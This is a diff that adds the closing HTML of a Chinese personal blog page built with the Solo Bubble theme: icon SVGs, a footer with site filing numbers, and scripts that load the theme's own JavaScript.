+                <path d="M4.821 14.393c-0.125-0.304-0.143-0.607-0.143-0.929 0-0.5 0.321-1.304 0.625-1.679-0.018-0.464 0.179-1.411 0.536-1.714 0-3.304 2.554-7.464 5.536-8.893 1.839-0.875 3.768-1.179 5.786-1.179 1.571 0 3.286 0.375 4.75 0.982 4.196 1.768 5.143 5.054 6.036 9.25l0.018 0.089c0.518 0.786 0.982 1.714 0.982 2.679 0 0.482-0.321 0.964-0.321 1.393 0 0.036 0.107 0.179 0.125 0.214 1.536 2.268 2.929 4.732 2.929 7.554 0 0.625-0.339 2.804-1.339 2.804-0.696 0-1.464-1.696-1.714-2.161-0.018-0.018-0.036-0.018-0.054-0.018l-0.089 0.071c-0.571 1.482-1.196 2.875-2.357 3.982 1.018 0.982 2.661 0.893 2.964 2.589-0.089 0.196-0.054 0.411-0.196 0.607-1.018 1.536-3.75 1.732-5.393 1.732-2.179 0-3.946-0.571-6-1.179-0.429-0.125-1.071-0.054-1.536-0.107-1.089 1.196-3.75 1.518-5.286 1.518-1.357 0-6.607-0.089-6.607-2.411 0-1 0.214-1.286 0.911-1.929 0.554-0.107 0.964-0.411 1.607-0.446 0.089 0 0.161-0.018 0.25-0.036 0.018-0.018 0.036-0.018 0.036-0.071l-0.036-0.054c-1.232-0.286-2.964-3.393-3.232-4.679l-0.089-0.054c-0.125 0-0.179 0.268-0.214 0.357-0.393 0.911-1.321 1.893-2.357 2h-0.018c-0.143 0-0.089-0.143-0.196-0.179-0.25-0.589-0.411-1.125-0.411-1.786 0-3.571 1.714-6.214 4.5-8.321z"></path>
+            </svg>
+        </a>
+        <a href="javascript:void(0)"
+           class="user__site" title="18203879479">
+            <svg viewBox="0 0 32 32" width="100%" height="100%">
+                <path d="M9.062 9.203c0-0.859-0.562-1.422-1.422-1.422-0.844 0-1.703 0.562-1.703 1.422 0 0.844 0.859 1.406 1.703 1.406 0.859 0 1.422-0.562 1.422-1.406zM20.672 17.125c0-0.562-0.562-1.125-1.422-1.125-0.562 0-1.125 0.562-1.125 1.125 0 0.578 0.562 1.141 1.125 1.141 0.859 0 1.422-0.562 1.422-1.141zM16.984 9.203c0-0.859-0.562-1.422-1.406-1.422-0.859 0-1.703 0.562-1.703 1.422 0 0.844 0.844 1.406 1.703 1.406 0.844 0 1.406-0.562 1.406-1.406zM26.906 17.125c0-0.562-0.578-1.125-1.422-1.125-0.562 0-1.125 0.562-1.125 1.125 0 0.578 0.562 1.141 1.125 1.141 0.844 0 1.422-0.562 1.422-1.141zM22.75 10.922c-0.359-0.047-0.719-0.063-1.094-0.063-5.375 0-9.625 4.016-9.625 8.953 0 0.828 0.125 1.625 0.359 2.375-0.359 0.031-0.703 0.047-1.063 0.047-1.422 0-2.547-0.281-3.969-0.562l-3.953 1.984 1.125-3.406c-2.828-1.984-4.531-4.547-4.531-7.656 0-5.391 5.094-9.625 11.328-9.625 5.563 0 10.453 3.391 11.422 7.953zM32 19.687c0 2.547-1.688 4.813-3.969 6.516l0.859 2.828-3.109-1.703c-1.141 0.281-2.281 0.578-3.406 0.578-5.391 0-9.625-3.688-9.625-8.219s4.234-8.219 9.625-8.219c5.094 0 9.625 3.688 9.625 8.219z"></path>
+            </svg>
+        </a>
+ <br>
+        &copy; 2020
+        <a href="https://ZZUGeneral.github.io">General 的个人博客</a>
+        你一定会喜欢那个因为喜欢她而发光的自己！
+        <span class="footer__heart">❤️</span><br>
+        <div align="center">
+          <a target="_blank" href="http://beian.miit.gov.cn" style="display:inline-block;text-decoration:none;height:20px;line-height:20px;"><p style="float:left;height:20px;line-height:20px;margin: 0px 0px 0px 5px; color:#939393;">豫ICP备2020028892号-1</p></a> &nbsp;
+          <a target="_blank" href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=41132602001081" style="display:inline-block;text-decoration:none;height:20px;line-height:20px;"><img src="https://img.hacpai.com/file/2019/07/备案图标-cc568907.png" style="float:left;"/><p style="float:left;height:20px;line-height:20px;margin: 0px 0px 0px 5px; color:#939393;">豫公网安备 41132602001081号</p></a>
+        </div>
+    </div>
+</footer>
+<svg class="side__top" id="sideTop" version="1.1" xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 32 32">
+    <path d="M26.562 13.958c0 0.72 0.583 1.303 1.303 1.303s1.303-0.583 1.303-1.303v0c0-0.72-0.583-1.303-1.303-1.303s-1.303 0.583-1.303 1.303v0zM23.305 10.7c0 0 0 0 0 0 0 0.72 0.583 1.303 1.303 1.303s1.303-0.583 1.303-1.303c0-0 0-0 0-0v0c0-0 0-0 0-0 0-0.72-0.583-1.303-1.303-1.303s-1.303 0.583-1.303 1.303c0 0 0 0 0 0v0zM20.022 7.417c0 0 0 0 0 0 0 0.72 0.583 1.303 1.303 1.303s1.303-0.583 1.303-1.303c0-0 0-0 0-0v0c0-0 0-0 0-0 0-0.72-0.583-1.303-1.303-1.303s-1.303 0.583-1.303 1.303c0 0 0 0 0 0v0zM29.67 0h-27.339c-0.677 0-1.228 0.551-1.228 1.228s0.551 1.228 1.228 1.228h11.151l-10.725 10.725c-0.476 0.476-0.476 1.253 0 1.729 0.226 0.226 0.551 0.351 0.852 0.351s0.626-0.125 0.852-0.351l10.074-10.074v25.936c0 0.677 0.551 1.228 1.228 1.228s1.228-0.551 1.228-1.228v-26.011c0.476 0.426 1.203 0.426 1.679-0.050s0.476-1.253 0-1.729l-0.576-0.576h11.577c0.677 0 1.228-0.551 1.228-1.228 0-0.626-0.551-1.178-1.228-1.178z"></path>
+</svg>
+<script>
+  var Label = {
+    speech: true,
+    servePath: "https://ZZUGeneral.github.io",
+    staticServePath: "https://ZZUGeneral.github.io",
+    luteAvailable: true,
+    hljsStyle: 'github',
+    langLabel: "zh_CN",
+    version: "4.3.1",
+    staticSite: true,
+    showCodeBlockLn: false,
+    articleId: "1602511210520",
+  }
+</script>
+<script type="text/javascript"
+        src="https://ZZUGeneral.github.io/skins/Bubble/js/common.min.js?1602754508835"
+        charset="utf-8"></script>
+<script type="text/javascript"
+        src="https://ZZUGeneral.github.io/skins/Bubble/js/circleMagic.min.js?1602754508835"
+        charset="utf-8"></script>
+
+    <svg viewBox="0 0 32 32" width="100%" height="100%" class="side__top side__top--toc">
+        <path d="M30 18h-28c-1.1 0-2-0.9-2-2s0.9-2 2-2h28c1.1 0 2 0.9 2 2s-0.9 2-2 2zM30 6.25h-28c-1.1 0-2-0.9-2-2s0.9-2 2-2h28c1.1 0 2 0.9 2 2s-0.9 2-2 2zM2 25.75h28c1.1 0 2 0.9 2 2s-0.9 2-2 2h-28c-1.1 0-2-0.9-2-2s0.9-2 2-2z"></path>
+    </svg>
+
+<script type="text/javascript">
+    Util.addScript('https://ZZUGeneral.github.io/js/page.min.js?1602754508835', 'soloPageScript')
+    var page = new Page({
+        "commentContentCannotEmptyLabel": "评论不能为空",
+        "oId": "1602511210520",
+        "blogHost": "https://ZZUGeneral.github.io",
+        "randomArticles1Label": "随机阅读：",
+        "externalRelevantArticles1Label": "站外相关阅读："
+    });
+    $(document).ready(function () {
+        page.load();
+    page.tips.externalRelevantArticlesDisplayCount = "0";
+        page.loadRandomArticles('<h3>随机阅读</h3>');
+        page.loadRelevantArticles('1602511210520', '<h3>相关阅读</h3>');
+    Skin.initArticle()
+    });
+</script>
+
+</body>
+</html>
+
+<!-- Generated by Latke (https://github.com/88250/latke) in 35ms, 2020/10/21 08:28:34 -->
